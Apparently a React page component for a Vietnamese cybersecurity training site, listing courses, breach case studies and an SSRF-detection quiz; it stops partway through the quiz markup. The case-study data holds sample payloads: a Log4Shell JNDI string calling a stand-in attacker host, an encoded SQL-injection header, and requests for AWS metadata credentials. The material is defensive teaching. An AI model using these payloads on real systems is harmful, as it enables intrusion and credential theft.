import { useState, useEffect } from "react"
import { Link, useSearchParams } from "react-router-dom"
import {
  Search,
  CheckCircle2,
  Clock,
  Award,
  Shield,
  Layers,
  ChevronDown,
  ChevronUp,
  ArrowRight,
  Terminal,
  Flame,
  Check,
  AlertTriangle,
  RotateCcw,
  Play,
  BookOpen,
  FileText,
} from "lucide-react"
import { Badge, Button, CountUp } from "../../components/common"
import { CourseSyllabusDrawer } from "./components/CourseSyllabusDrawer"
import { InteractiveLessonModal } from "./components/InteractiveLessonModal"
import useLearningStore from "../../stores/useLearningStore"
import useNotificationStore from "../../stores/useNotificationStore"

const CATEGORIES = [
  { id: "all", label: "Tất Cả Modules", count: 6 },
  { id: "web", label: "Web Pentest & OWASP", count: 1 },
  { id: "defensive", label: "SOC Triage & Crypto", count: 2 },
  { id: "network", label: "Network Forensics", count: 1 },
  { id: "cloud", label: "Cloud & Kubernetes", count: 1 },
  { id: "reverse", label: "Binary & Reverse Eng", count: 1 },
]

// Professional Real-World Incident Case Studies (Depth & Retention Engine)
const REAL_WORLD_CASE_STUDIES = [
  {
    id: "cs-1",
    tag: "Cloud / SSRF",
    cve: "AWS-IMDS-SSRF",
    victim: "Capital One Data Breach (106M Hồ Sơ Bị Rò Rỉ)",
    attackVector: "Server-Side Request Forgery qua ModSecurity WAF reverse proxy",
    impact: "Khai thác địa chỉ Link-Local 169.254.169.254 để trích xuất IAM Role keys tạm thời, sau đó tải về hơn 700 S3 buckets.",
    rootCause: "Reverse proxy cho phép forward các request tùy ý từ người dùng tới internal metadata service mà không có token bắt buộc.",
    remediation: "Bắt buộc nâng cấp lên AWS IMDSv2 (yêu cầu session token qua HTTP PUT) và thiết lập network hop-limit = 1.",
    logSnippet: "GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/waf-role HTTP/1.1",
  },
  {
    id: "cs-2",
    tag: "SQLi / Zero-Day",
    cve: "CVE-2023-34362",
    victim: "MOVEit Transfer Enterprise Zero-Day Campaign",
    attackVector: "SQL Injection qua HTTP Request Header trong REST API",
    impact: "Chiến dịch tống tiền Cl0p Ransomware đánh cắp dữ liệu của hơn 2,000 tổ chức tài chính & chính phủ toàn cầu.",
    rootCause: "Ứng dụng giải mã header X-siLock-SessionInfo mà không dùng tham số hóa, chèn trực tiếp chuỗi vào câu lệnh SQL.",
    remediation: "Áp dụng Prepared Statements bắt buộc cho toàn bộ database driver và vô hiệu hóa endpoint guest API không xác thực.",
    logSnippet: "Headers: X-siLock-SessionInfo: eyJ1c2VyIjoiYWRtaW4nIFVOSU9OIFNFTEVDVCBudWxsLC4uLiJ9",
  },
  {
    id: "cs-3",
    tag: "RCE / Supply Chain",
    cve: "CVE-2021-44228",
    victim: "Apache Log4j (Log4Shell Remote Code Execution)",
    attackVector: "JNDI Lookup Injection trong User-Agent & HTTP Telemetry",
    impact: "Thực thi mã từ xa (RCE) ngay lập tức trên hàng triệu ứng dụng Java doanh nghiệp.",
    rootCause: "Thư viện Log4j mặc định phân giải biểu thức chuỗi dạng ${jndi:ldap://...} khi ghi log mà không kiểm tra độ tin cậy.",
    remediation: "Nâng cấp Log4j 2.17.1+, bật cấu hình log4j2.formatMsgNoLookups=true, chặn triệt để egress LDAP/RMI tại firewall.",
    logSnippet: "User-Agent: ${jndi:ldap://adversary-c2.internal/Exploit.class}",
  },
]

export function Learning() {
  const {
    courses,
    completedLessons,
    enrolledCourses,
    getCourseProgress,
    openLessonModal,
    toggleLesson,
    launchLessonLab,
    userXp,
  } = useLearningStore()

  const [activeCategory, setActiveCategory] = useState("all")
  const [searchQuery, setSearchQuery] = useState("")
  const [selectedDifficulty, setSelectedDifficulty] = useState("all")
  const [expandedSyllabus, setExpandedSyllabus] = useState({ "mod-web201": true })
  const [activeCaseStudyIndex, setActiveCaseStudyIndex] = useState(0)
  
  // Interactive Daily Threat Drill State
  const [drillAnswer, setDrillAnswer] = useState(null)
  const [drillSubmitted, setDrillSubmitted] = useState(false)
  const [drawerCourse, setDrawerCourse] = useState(null)

  const [searchParams] = useSearchParams()
  useEffect(() => {
    const courseParam = searchParams.get("course")
    const lessonParam = searchParams.get("lesson")
    if (courseParam) {
      openLessonModal(courseParam, lessonParam)
    }
  }, [searchParams, openLessonModal])

  const toggleSyllabus = (modId) => {
    setExpandedSyllabus((prev) => ({
      ...prev,
      [modId]: !prev[modId],
    }))
  }

  const filteredModules = courses.filter((mod) => {
    const matchesCategory = activeCategory === "all" || mod.category === activeCategory
    const matchesDifficulty =
      selectedDifficulty === "all" ||
      (mod.difficultyKey && mod.difficultyKey.toLowerCase() === selectedDifficulty.toLowerCase()) ||
      mod.difficulty.toLowerCase() === selectedDifficulty.toLowerCase()
    const matchesSearch =
      mod.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
      mod.code.toLowerCase().includes(searchQuery.toLowerCase()) ||
      mod.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
      mod.cert.toLowerCase().includes(searchQuery.toLowerCase())

    return matchesCategory && matchesDifficulty && matchesSearch
  })

  const handleDrillSubmit = (index) => {
    setDrillAnswer(index)
    setDrillSubmitted(true)
    if (index === 0) {
      useNotificationStore.getState().success(
        "Chính Xác! +150 XP Thưởng Threat Hunter",
        "Bạn đã phân tích chính xác lỗ hổng SSRF nhắm vào AWS Instance Metadata."
      )
    }
  }

  const handleDrillReset = () => {
    setDrillAnswer(null)
    setDrillSubmitted(false)
  }

  const currentCaseStudy = REAL_WORLD_CASE_STUDIES[activeCaseStudyIndex]

  return (
    <div className="space-y-10 pb-10 sm:pb-12 animate-fade-in-up">
      {/* ====================================================================
          1. ACADEMY MISSION CONTROL HUD (HERO BANNER - CYBER RANGE THEME)
         ==================================================================== */}
      <section className="relative rounded-3xl bg-gradient-to-br from-slate-900 via-slate-900 to-indigo-950/90 border border-slate-700/60 dark:border-slate-800 shadow-xl p-6 sm:p-8 overflow-hidden text-white">
        {/* Neon laser accent bar */}
        <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-cyan-500 via-blue-500 to-indigo-500" />
        
        {/* Cyber Watermark Icon */}
        <div className="absolute -right-8 -bottom-8 opacity-5 pointer-events-none select-none text-cyan-400">
          <Shield className="w-96 h-96" />
        </div>

        <div className="relative z-10 flex flex-col lg:flex-row lg:items-center lg:justify-between gap-6">
          <div className="space-y-3.5 max-w-2xl">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="font-mono text-[11px] font-bold px-2.5 py-1 rounded-md bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 uppercase tracking-wider">
                CYBER RANGE ACADEMY
              </span>
              <span className="font-mono text-[11px] font-bold px-2.5 py-1 rounded-md bg-emerald-950/60 text-emerald-300 border border-emerald-800/40 flex items-center gap-1.5">
                <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" />
                <span>6 CHUYÊN ĐỀ TÁC CHIẾN TRỰC TUYẾN</span>
              </span>
              <span className="font-mono text-[10px] text-slate-400 hidden sm:inline-block">
                MITRE ATT&CK & NIST SP 800-181 COMPLIANT
              </span>
            </div>

            <h1 className="text-2xl sm:text-3xl lg:text-4xl font-extrabold text-white tracking-tight leading-tight">
              Giáo Trình Thực Chiến An Ninh Mạng & Phân Tích Khai Thác
            </h1>

            <p className="text-slate-300 text-sm sm:text-base leading-relaxed font-sans">
              Mỗi bài học được thiết kế chuẩn thao trường (Cyber Range) với kịch bản mã độc thực tế, payload khai thác chi tiết, phân tích code và máy ảo sandbox tương tác độc lập.
            </p>
          </div>

          {/* Quick HUD Metrics Card */}
          <div className="grid grid-cols-2 gap-3 p-4 rounded-2xl bg-slate-950/80 border border-slate-700/60 dark:border-slate-800 shadow-xl backdrop-blur-md shrink-0 min-w-[280px]">
            <div className="p-3 rounded-xl bg-slate-900/90 border border-slate-700/50 dark:border-slate-800/80">
              <span className="text-[10px] font-mono font-bold text-slate-400 uppercase block">Học Viên Trực Chiến</span>
              <span className="text-lg font-mono font-extrabold text-cyan-400">
                <CountUp end={14820} duration={200} />
              </span>
            </div>
            <div className="p-3 rounded-xl bg-slate-900/90 border border-slate-700/50 dark:border-slate-800/80">
              <span className="text-[10px] font-mono font-bold text-slate-400 uppercase block">Hạ Tầng Labs Thực Địa</span>
              <span className="text-lg font-mono font-extrabold text-emerald-400">
                <CountUp end={68} duration={200} suffix=" VMs" />
              </span>
            </div>
            <div className="p-3 rounded-xl bg-slate-900/90 border border-slate-700/50 dark:border-slate-800/80">
              <span className="text-[10px] font-mono font-bold text-slate-400 uppercase block">Tổng Điểm XP Tích Lũy</span>
              <span className="text-lg font-mono font-extrabold text-amber-400 flex items-center gap-1">
                <Flame className="w-4 h-4 fill-amber-400 text-amber-400" />
                <span>{userXp} XP</span>
              </span>
            </div>
            <div className="p-3 rounded-xl bg-slate-900/90 border border-slate-700/50 dark:border-slate-800/80">
              <span className="text-[10px] font-mono font-bold text-slate-400 uppercase block">Mùa Diễn Tập</span>
              <span className="text-lg font-mono font-extrabold text-indigo-400">Cyber Range Cấp 2</span>
            </div>
          </div>
        </div>
      </section>

      {/* ====================================================================
          2. FILTER & SEARCH CONTROL MATRIX (Adaptive Light/Dark Harmony)
         ==================================================================== */}
      <div className="space-y-4">
        {/* Category Pill Filters */}
        <div className="flex items-center gap-2 overflow-x-auto pb-2 scrollbar-none">
          {CATEGORIES.map((cat) => (
            <button
              key={cat.id}
              onClick={() => setActiveCategory(cat.id)}
              className={`px-4 py-2 rounded-xl text-xs font-semibold whitespace-nowrap transition-all duration-200 cursor-pointer flex items-center gap-2 ${
                activeCategory === cat.id
                  ? "bg-blue-600 dark:bg-cyan-500 text-white dark:text-slate-950 font-bold shadow-2xs"
                  : "bg-white dark:bg-slate-900/70 hover:bg-slate-100 dark:hover:bg-slate-800 text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-800 shadow-2xs"
              }`}
            >
              <span>{cat.label}</span>
              <span
                className={`text-[10px] px-1.5 py-0.2 rounded-full font-mono ${
                  activeCategory === cat.id
                    ? "bg-white/20 dark:bg-slate-950/30 text-white dark:text-slate-950 font-bold"
                    : "bg-slate-100 dark:bg-slate-800 text-slate-500 dark:text-slate-400"
                }`}
              >
                {cat.count}
              </span>
            </button>
          ))}
        </div>

        {/* Search & Difficulty Filter Toolbar */}
        <div className="flex flex-col sm:flex-row gap-3 items-stretch sm:items-center justify-between">
          <div className="relative flex-1 max-w-md">
            <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400" />
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Tìm mã module (e.g. WEB-201), CVE, OWASP hoặc chứng chỉ..."
              className="w-full pl-10 pr-4 py-2.5 rounded-xl text-xs sm:text-sm bg-white dark:bg-slate-900/80 border border-slate-200 dark:border-slate-800 text-slate-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500/30 dark:focus:ring-cyan-500/30 focus:border-blue-500 dark:focus:border-cyan-500 placeholder:text-slate-400 dark:placeholder:text-slate-500 transition-all shadow-xs"
            />
          </div>

          <div className="flex items-center gap-2 shrink-0">
            <span className="text-xs text-slate-500 dark:text-slate-400 font-mono hidden sm:inline">ĐỘ KHÓ:</span>
            {[
              { id: "all", label: "Tất Cả" },
              { id: "novice", label: "Cơ Bản" },
              { id: "intermediate", label: "Trung Cấp" },
              { id: "specialist", label: "Chuyên Gia" },
            ].map(({ id, label }) => (
              <button
                key={id}
                onClick={() => setSelectedDifficulty(id)}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono uppercase font-semibold transition-all cursor-pointer ${
                  selectedDifficulty === id
                    ? "bg-slate-900 dark:bg-slate-100 text-white dark:text-slate-950 shadow-sm font-bold"
                    : "bg-white dark:bg-slate-900/70 text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200 dark:border-slate-800 shadow-2xs"
                }`}
              >
                {label}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* ====================================================================
          3. MAIN MODULE LISTING & INTERACTIVE DRILL SIDEBAR
         ==================================================================== */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
        {/* LEFT COLUMN: MODULE CARDS WITH EXPANDABLE SYLLABUS (8 COLS) */}
        <div className="lg:col-span-8 space-y-6">
          <div className="flex items-center justify-between">
            <h2 className="text-xs font-bold font-mono uppercase tracking-wider text-slate-500 dark:text-slate-400 flex items-center gap-2">
              <BookOpen className="w-4 h-4 text-blue-600 dark:text-cyan-400" />
              <span>GIÁO TRÌNH TÁC CHIẾN ({filteredModules.length} MODULES)</span>
            </h2>
            <span className="text-[11px] text-blue-600 dark:text-cyan-400 font-mono font-semibold">
              BẤM VÀO BÀI HỌC ĐỂ MỞ MISSION CONSOLE
            </span>
          </div>

          {filteredModules.length === 0 ? (
            <div className="p-12 text-center bg-white dark:bg-slate-900 rounded-3xl border border-slate-200 dark:border-slate-800 space-y-3 shadow-sm">
              <Search className="h-10 w-10 text-slate-400 dark:text-slate-500 mx-auto" />
              <p className="text-sm font-medium text-slate-700 dark:text-slate-300">Không tìm thấy module phù hợp với bộ lọc hiện tại.</p>
              <Button
                variant="outline"
                size="sm"
                onClick={() => {
                  setActiveCategory("all")
                  setSelectedDifficulty("all")
                  setSearchQuery("")
                }}
              >
                Đặt lại bộ lọc
              </Button>
            </div>
          ) : (
            filteredModules.map((mod) => {
              const isExpanded = !!expandedSyllabus[mod.id]
              const isEnrolled = enrolledCourses.includes(mod.id)
              const progress = getCourseProgress(mod.id)
              const completedList = completedLessons[mod.id] || []

              return (
                <div
                  key={mod.id}
                  className="p-5 sm:p-6 rounded-3xl bg-white dark:bg-slate-900/90 border border-slate-200 dark:border-slate-800/90 hover:border-blue-400 dark:hover:border-cyan-500/40 shadow-sm hover:shadow-md dark:shadow-xl transition-all duration-300 relative overflow-hidden group space-y-4"
                >
                  {/* Subtle top indicator for enrolled courses */}
                  {isEnrolled && (
                    <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-blue-600 via-cyan-500 to-emerald-500" />
                  )}

                  <div className="space-y-4">
                    {/* Header Row: Code + Track + Difficulty + CVSS */}
                    <div className="flex flex-wrap items-center justify-between gap-2.5">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="px-2.5 py-0.5 rounded font-mono text-xs font-bold bg-blue-50 dark:bg-cyan-500/10 text-blue-700 dark:text-cyan-400 border border-blue-200 dark:border-cyan-500/30">
                          {mod.code}
                        </span>

                        <Badge
                          variant={
                            mod.difficulty === "Cơ Bản" || mod.difficulty === "Novice"
                              ? "success"
                              : mod.difficulty === "Trung Cấp" || mod.difficulty === "Intermediate"
                              ? "primary"
                              : "warning"
                          }
                          size="sm"
                        >
                          {mod.difficulty}
                        </Badge>

                        <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-700">
                          {mod.cert}
                        </span>

                        <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-100 dark:bg-slate-800/80 text-amber-700 dark:text-amber-300 border border-amber-200 dark:border-amber-900/30 hidden sm:inline-block">
                          MITRE: {mod.mitre}
                        </span>

                        <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-rose-50 dark:bg-rose-950/40 text-rose-700 dark:text-rose-300 border border-rose-200 dark:border-rose-800/40">
                          CVSS {mod.cvssBase}
                        </span>
                      </div>

                      <div className="flex items-center gap-3 text-xs font-mono text-slate-500 dark:text-slate-400">
                        <span className="flex items-center gap-1 text-blue-600 dark:text-cyan-400 font-semibold">
                          <Clock className="h-3.5 w-3.5" />
                          {mod.duration}
                        </span>
                        <span className="flex items-center gap-1 hidden sm:flex">
                          <Layers className="h-3.5 w-3.5 text-slate-400" />
                          {mod.lessonsCount} Bài giảng
                        </span>
                      </div>
                    </div>

                    {/* Title & Technical Description */}
                    <div className="space-y-1.5">
                      <h3
                        onClick={() => openLessonModal(mod.id)}
                        className="text-base sm:text-lg font-bold text-slate-900 dark:text-white group-hover:text-blue-600 dark:group-hover:text-cyan-400 transition-colors cursor-pointer"
                      >
                        {mod.title}
                      </h3>
                      <p className="text-xs sm:text-sm text-slate-600 dark:text-slate-300 leading-relaxed font-sans">
                        {mod.description}
                      </p>
                    </div>

                    {/* Progress Bar (Dynamic from Store) */}
                    {isEnrolled && (
                      <div className="rounded-2xl bg-slate-50 dark:bg-slate-950 p-3.5 border border-slate-200 dark:border-slate-800/90 space-y-1.5">
                        <div className="flex justify-between items-center text-xs font-semibold">
                          <span className="text-slate-700 dark:text-slate-300 font-mono">TIẾN ĐỘ HOÀN THÀNH</span>
                          <span className="text-blue-600 dark:text-cyan-400 font-mono">{progress}% ({completedList.length}/{mod.syllabus.length} bài)</span>
                        </div>
                        <div className="w-full h-2 rounded-full bg-slate-200 dark:bg-slate-800 overflow-hidden">
                          <div
                            className="h-full bg-gradient-to-r from-blue-600 via-cyan-500 to-emerald-500 rounded-full transition-all duration-500"
                            style={{ width: `${progress}%` }}
                          />
                        </div>
                      </div>
                    )}

                    {/* Action Bar & Accordion Trigger */}
                    <div className="pt-2 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 border-t border-slate-100 dark:border-slate-800">
                      <button
                        onClick={() => toggleSyllabus(mod.id)}
                        className="inline-flex items-center gap-1.5 text-xs font-semibold text-blue-600 dark:text-cyan-400 hover:text-blue-700 dark:hover:text-cyan-300 transition-colors cursor-pointer self-start sm:self-auto font-mono"
                      >
                        {isExpanded ? (
                          <>
                            <ChevronUp className="h-4 w-4" />
                            <span>Thu gọn giáo trình</span>
                          </>
                        ) : (
                          <>
                            <ChevronDown className="h-4 w-4" />
                            <span>Xem chi tiết {mod.lessonsCount} Bài Học & {mod.labsCount} Labs</span>
                          </>
                        )}
                      </button>

                      <div className="flex items-center gap-2.5">
                        <button
                          onClick={() => setDrawerCourse(mod)}
                          className="px-3 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300 font-mono text-xs transition-colors cursor-pointer border border-slate-200 dark:border-slate-700"
                        >
                          Syllabus Drawer
                        </button>

                        <button
                          onClick={() => launchLessonLab(mod.labId)}
                          className="px-3 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-blue-600 dark:text-cyan-400 font-mono text-xs flex items-center gap-1.5 transition-colors cursor-pointer border border-blue-200 dark:border-cyan-500/30"
                        >
                          <Terminal className="h-3.5 w-3.5" />
                          <span>Sandbox Lab</span>
                        </button>

                        <button
                          onClick={() => openLessonModal(mod.id)}
                          className="px-4 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-700 dark:bg-cyan-500 dark:hover:bg-cyan-400 text-white dark:text-slate-950 font-bold text-xs flex items-center gap-1.5 shadow-2xs transition-all cursor-pointer"
                        >
                          <Play className="h-3.5 w-3.5 fill-current" />
                          <span>
                            {progress === 100
                              ? "Ôn Tập Khóa"
                              : progress > 0
                              ? "Tiếp Tục Bài Học"
                              : "Vào Học Ngay"}
                          </span>
                        </button>
                      </div>
                    </div>

                    {/* Expandable Syllabus Accordion */}
                    {isExpanded && (
                      <div className="mt-3 pt-3 border-t border-slate-100 dark:border-slate-800 space-y-2 animate-fade-in-up">
                        <div className="flex items-center justify-between text-[11px] font-mono text-slate-500 dark:text-slate-400 uppercase tracking-wider">
                          <span>DANH SÁCH BÀI GIẢNG & PHÂN TÍCH THỰC CHIẾN</span>
                          <span className="text-blue-600 dark:text-cyan-400 font-semibold">Click để mở bài học</span>
                        </div>

                        <div className="space-y-1.5">
                          {mod.syllabus.map((lesson, idx) => {
                            const isLessonDone = completedList.includes(lesson.id)

                            return (
                              <div
                                key={lesson.id}
                                className={`p-3 rounded-xl flex items-center justify-between text-xs transition-all group ${
                                  isLessonDone
                                    ? "bg-emerald-50/80 dark:bg-emerald-950/20 border border-emerald-200 dark:border-emerald-500/30 text-slate-800 dark:text-slate-200"
                                    : "bg-slate-50/70 hover:bg-slate-100/90 dark:bg-slate-950/60 dark:hover:bg-slate-800/80 border border-slate-200 dark:border-slate-800 hover:border-blue-400 dark:hover:border-cyan-500/40 text-slate-800 dark:text-slate-200"
                                }`}
                              >
                                {/* Left: Checkbox + Title */}
                                <div className="flex items-center gap-3 flex-1 min-w-0">
                                  <button
                                    onClick={(e) => {
                                      e.stopPropagation()
                                      toggleLesson(mod.id, lesson.id)
                                    }}
                                    className={`w-4 h-4 rounded-full flex items-center justify-center shrink-0 transition-colors cursor-pointer ${
                                      isLessonDone
                                        ? "bg-emerald-500 text-white"
                                        : "border border-slate-300 dark:border-slate-600 hover:border-blue-500 dark:hover:border-cyan-400 text-transparent hover:text-blue-500"
                                    }`}
                                    title={isLessonDone ? "Đánh dấu chưa học" : "Đánh dấu đã hoàn thành"}
                                  >
                                    <CheckCircle2 className="h-3.5 w-3.5" />
                                  </button>

                                  <div
                                    onClick={() => openLessonModal(mod.id, lesson.id)}
                                    className="cursor-pointer flex-1 min-w-0"
                                  >
                                    <div className="flex items-center gap-2">
                                      <span className="font-mono text-[10px] text-blue-600 dark:text-cyan-400 font-bold">
                                        Bài {String(idx + 1).padStart(2, "0")}
                                      </span>
                                      <span className={`font-medium truncate ${isLessonDone ? "line-through text-slate-400 dark:text-slate-500" : "group-hover:text-blue-600 dark:group-hover:text-cyan-400"}`}>
                                        {lesson.title}
                                      </span>
                                    </div>
                                  </div>
                                </div>

                                {/* Right: Duration + Launch Button */}
                                <div className="flex items-center gap-3 shrink-0 ml-3 font-mono text-[11px] text-slate-400">
                                  <span>{lesson.duration}</span>
                                  <button
                                    onClick={() => openLessonModal(mod.id, lesson.id)}
                                    className="p-1 rounded text-slate-400 hover:text-blue-600 dark:hover:text-cyan-400 transition-colors cursor-pointer"
                                    title="Mở Mission Console"
                                  >
                                    <ArrowRight className="h-3.5 w-3.5" />
                                  </button>
                                </div>
                              </div>
                            )
                          })}
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              )
            })
          )}

          {/* ====================================================================
              DEPTH ENHANCEMENT: REAL-WORLD BREACH CASE STUDIES DOSSIER
             ==================================================================== */}
          <section className="p-6 rounded-3xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-md space-y-5 text-slate-900 dark:text-white">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-slate-100 dark:border-slate-800">
              <div className="flex items-center gap-2.5">
                <div className="p-2 rounded-xl bg-blue-50 dark:bg-blue-950/60 text-blue-600 dark:text-cyan-400 border border-blue-200 dark:border-blue-800/60">
                  <FileText className="h-4 w-4" />
                </div>
                <div>
                  <h3 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
                    <span>Hồ Sơ Sự Cố An Ninh Mạng Thực Chiến (Case Studies)</span>
                  </h3>
                  <p className="text-[11px] text-slate-500 dark:text-slate-400">
                    Phân tích chi tiết nguyên nhân gốc rễ và cơ chế phòng thủ của các chiến dịch rò rỉ nổi tiếng
                  </p>
                </div>
              </div>

              {/* Case Study Selection Tabs */}
              <div className="flex items-center gap-1.5 overflow-x-auto pb-1 scrollbar-none">
                {REAL_WORLD_CASE_STUDIES.map((cs, idx) => (
                  <button
                    key={cs.id}
                    type="button"
                    onClick={() => setActiveCaseStudyIndex(idx)}
                    className={`px-3 py-1.5 rounded-xl text-xs font-mono font-bold transition-all cursor-pointer whitespace-nowrap ${
                      activeCaseStudyIndex === idx
                        ? "bg-blue-600 dark:bg-cyan-500 text-white dark:text-slate-950 shadow-xs"
                        : "bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-700"
                    }`}
                  >
                    {cs.tag}
                  </button>
                ))}
              </div>
            </div>

            {/* Active Case Study Detailed Card */}
            <div className="space-y-4">
              <div className="flex items-center justify-between flex-wrap gap-2">
                <div className="flex items-center gap-2">
                  <span className="font-mono text-xs font-bold px-2.5 py-0.5 rounded bg-rose-50 dark:bg-rose-950/50 text-rose-700 dark:text-rose-300 border border-rose-200 dark:border-rose-800/40">
                    {currentCaseStudy.cve}
                  </span>
                  <span className="font-bold text-sm text-slate-900 dark:text-white">
                    {currentCaseStudy.victim}
                  </span>
                </div>
                <span className="text-[11px] font-mono text-slate-400">
                  Phân tích kỹ thuật chuyên sâu
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3.5 text-xs">
                <div className="p-3.5 rounded-xl bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 space-y-1">
                  <span className="text-[10px] font-mono font-bold text-rose-600 dark:text-rose-400 uppercase block">
                    Vector Tấn Công & Hậu Quả
                  </span>
                  <p className="font-semibold text-slate-800 dark:text-slate-200">
                    {currentCaseStudy.attackVector}
                  </p>
                  <p className="text-slate-600 dark:text-slate-400 text-[11px] leading-relaxed">
                    {currentCaseStudy.impact}
                  </p>
                </div>

                <div className="p-3.5 rounded-xl bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 space-y-1">
                  <span className="text-[10px] font-mono font-bold text-emerald-600 dark:text-emerald-400 uppercase block">
                    Nguyên Nhân Gốc Rễ & Bản Vá Phòng Thủ
                  </span>
                  <p className="text-slate-700 dark:text-slate-300 text-[11px] leading-relaxed">
                    <strong>Nguyên nhân cốt lõi:</strong> {currentCaseStudy.rootCause}
                  </p>
                  <p className="text-slate-700 dark:text-slate-300 text-[11px] leading-relaxed pt-1">
                    <strong>Giải pháp vá:</strong> {currentCaseStudy.remediation}
                  </p>
                </div>
              </div>

              {/* Log / Payload Telemetry Snippet */}
              <div className="p-3 rounded-xl bg-slate-100 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 font-mono text-xs text-slate-800 dark:text-emerald-400 overflow-x-auto shadow-inner">
                <code>{currentCaseStudy.logSnippet}</code>
              </div>
            </div>
          </section>
        </div>

        {/* RIGHT COLUMN: INTERACTIVE DAILY THREAT DRILL & CERTIFICATION ROADMAP (4 COLS) */}
        <div className="lg:col-span-4 space-y-6">
          {/* ====================================================================
              WIDGET 1: INTERACTIVE DAILY THREAT DRILL (GAMIFIED PROTOCOL CHALLENGE)
             ==================================================================== */}
          <div className="p-5 rounded-3xl bg-white dark:bg-slate-900 border border-blue-200 dark:border-cyan-500/30 shadow-md relative overflow-hidden text-slate-900 dark:text-white space-y-3">
            {/* Top Badge */}
            <div className="flex items-center justify-between gap-2">
              <span className="font-mono text-[10px] font-bold px-2 py-0.5 rounded bg-blue-600 dark:bg-cyan-500 text-white dark:text-slate-950 uppercase tracking-wider">
                DAILY SOC THREAT DRILL
              </span>
              <span className="text-[11px] font-mono text-amber-500 dark:text-amber-400 font-bold flex items-center gap-1">
                <Flame className="h-3.5 w-3.5 fill-amber-400" />
                +150 XP
              </span>
            </div>

            <h3 className="text-sm font-bold text-slate-900 dark:text-white">
              Phát Hiện Vector Tấn Công Trong HTTP Request Này
            </h3>
            
            <p className="text-xs text-slate-500 dark:text-slate-400">
              Cụm WAF Reverse Proxy vừa chặn request bất thường gửi tới endpoint nội bộ:
            </p>

            {/* Code / Telemetry Log Snippet */}
            <div className="rounded-xl bg-slate-100 dark:bg-slate-950 p-3 font-mono text-[11px] text-slate-800 dark:text-slate-200 overflow-x-auto space-y-1 shadow-inner border border-slate-200 dark:border-slate-800">
              <div className="text-blue-700 dark:text-emerald-400 font-bold">
                GET /api/v1/proxy?target=http://169.254.169.254/latest/meta-data/ HTTP/1.1
              </div>
              <div className="text-slate-500">Host: app.enterprise-corp.internal</div>
              <div className="text-slate-500">User-Agent: curl/7.88.1</div>
              <div className="text-slate-500">Authorization: Bearer test_token</div>
            </div>

            {/* Interactive Options */}
            <div className="space-y-2">
              {[
                { label: "Server-Side Request Forgery (SSRF) khai thác Cloud Metadata AWS", isCorrect: true },
                { label: "Blind Time-Based SQL Injection qua param Target", isCorrect: false },
                { label: "Cross-Site Scripting (XSS) qua DOM Sink Injection", isCorrect: false },
                { label: "Insecure Direct Object Reference (IDOR) trên User Profile", isCorrect: false },
              ].map((opt, idx) => {
                const isSelected = drillAnswer === idx
                return (
                  <button
                    key={idx}
                    disabled={drillSubmitted}
                    onClick={() => handleDrillSubmit(idx)}
                    className={`w-full text-left p-2.5 rounded-xl text-xs transition-all flex items-start gap-2.5 cursor-pointer border ${
                      drillSubmitted
                        ? opt.isCorrect
                          ? "bg-emerald-50 dark:bg-emerald-950/40 border-emerald-500 text-emerald-800 dark:text-emerald-200 font-semibold"
                          : isSelected
                          ? "bg-rose-50 dark:bg-rose-950/40 border-rose-500 text-rose-800 dark:text-rose-200"
                          : "bg-slate-50 dark:bg-slate-950/40 border-slate-200 dark:border-slate-850 text-slate-400 opacity-60"
                        : "bg-slate-50 hover:bg-slate-100 dark:bg-slate-950 dark:hover:bg-slate-850 border-slate-200 dark:border-slate-800 text-slate-700 dark:text-slate-300 hover:border-blue-400 dark:hover:border-cyan-500/40"
                    }`}
                  >
                    <span className="font-mono text-[10px] font-bold px-1.5 py-0.5 rounded bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 text-slate-600 dark:text-slate-400 shrink-0">
                      {String.fromCharCode(65 + idx)}
                    </span>
                    <span className="flex-1 leading-snug">{opt.label}</span>
                  </button>
                )
              })}
            </div>

            {/* Drill Result Explanation */}
            {drillSubmitted && (
              <div className="mt-3 p-3.5 rounded-xl bg-slate-50 dark:bg-slate-950 border border-blue-200 dark:border-cyan-500/30 text-xs space-y-2 animate-fade-in-up">
                <div className="flex items-center gap-1.5 font-bold font-mono">
                  {drillAnswer === 0 ? (
                    <>
                      <Check className="h-4 w-4 text-emerald-600 dark:text-emerald-400 shrink-0" />
